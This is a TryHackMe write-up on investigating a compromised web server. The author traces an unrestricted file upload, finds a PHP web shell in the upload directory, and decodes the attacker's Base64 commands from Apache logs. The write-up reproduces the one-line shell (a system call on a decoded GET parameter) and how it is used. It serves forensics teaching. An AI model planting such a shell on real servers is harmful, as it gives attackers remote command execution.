# 🐚 Infinity Shell - TryHackMe Writeup

## Room Overview

**Infinity Shell** is a beginner-friendly digital forensics and incident response challenge that focuses on investigating a compromised web server. The objective is to identify how the attacker gained access, locate the malicious web shell, analyze attacker activity, and recover the flag.

## Skills Learned

* Linux file system investigation
* Web shell detection
* Apache log analysis
* Base64 decoding
* Incident response methodology
* Web application security

---

## Scenario

A vulnerable web application was exploited by an attacker who uploaded a malicious web shell to the server. My task was to investigate the compromise and determine what actions the attacker performed after gaining access.

---

## Step 1: Investigating the Web Application

The challenge hints suggested a web application compromise, so I began by inspecting the web root directory.

```bash
cd /var/www/html
```

Inside the web root, I discovered a directory named:

```text
CMSsite-master
```

This indicated the presence of a CMS application that may have been vulnerable to attack.

### What I Learned

Web applications are common attack targets. Investigators should first identify the application in use and determine whether known vulnerabilities exist.

---

## Step 2: Locating the Malicious Upload

Research into the CMS revealed a file upload vulnerability that allowed attackers to upload arbitrary files to the server.

The uploaded files were stored in:

```bash
/var/www/html/CMSsite-master/img
```

After navigating to this directory, I discovered a suspicious file:

```text
images.php
```

Examining the file contents revealed:

```php
<?php system(base64_decode($_GET['query'])); ?>
```

### Analysis

This PHP script acts as a web shell.

It accepts a Base64-encoded command through the URL parameter:

```text
?query=<base64_command>
```

The command is decoded and executed on the server using the `system()` function.

### What I Learned

Web shells provide attackers with remote command execution and are often hidden within upload directories where administrators rarely investigate.

---

## Step 3: Investigating Apache Access Logs

After identifying the web shell, the next step was determining what commands the attacker executed.

Apache logs were located in:

```bash
cd /var/log/apache2
```

To identify attacker activity, I searched for requests containing the `query=` parameter.

```bash
grep -Eo 'query=[A-Za-z0-9+/=]{10,}' /var/log/apache2/*.log*
```

This command extracts Base64-encoded values supplied to the web shell.

### Why This Works

The attacker sends commands encoded in Base64.

The web shell decodes them before execution.

The Apache logs preserve those requests, allowing investigators to reconstruct attacker actions.

---

## Step 4: Decoding the Commands

The extracted values were decoded using CyberChef and Base64 decoding.

This revealed the commands executed by the attacker and ultimately led to the challenge flag.

### Investigation Process

```text
Compromised Web Application
            ↓
Uploaded PHP Web Shell
            ↓
Apache Access Logs
            ↓
Extract Base64 Commands
            ↓
Decode Commands
            ↓
Recover Flag
```

---

## Key Indicators of Compromise (IOCs)

| IOC Type         | Value                            |
| ---------------- | -------------------------------- |
| Web Shell        | images.php                       |
| Upload Directory | /var/www/html/CMSsite-master/img |
| Log Location     | /var/log/apache2                 |
| Execution Method | Base64-encoded query parameter   |
| Vulnerability    | Unrestricted File Upload         |

---

## Key Takeaways

* File upload vulnerabilities can lead directly to remote code execution.
* Web shells are often hidden within upload directories.
* Apache access logs are valuable sources of forensic evidence.
* Base64 encoding is frequently used to hide attacker commands.
* Investigators should always correlate web server logs with suspicious files.

---

## Conclusion

This room demonstrated how attackers can exploit insecure file upload functionality to deploy web shells and execute commands remotely. By locating the malicious PHP file, analyzing Apache logs, and decoding attacker commands, I was able to reconstruct the attacker's activity and recover the flag.

The challenge reinforced fundamental DFIR techniques used during web server compromise investigations.
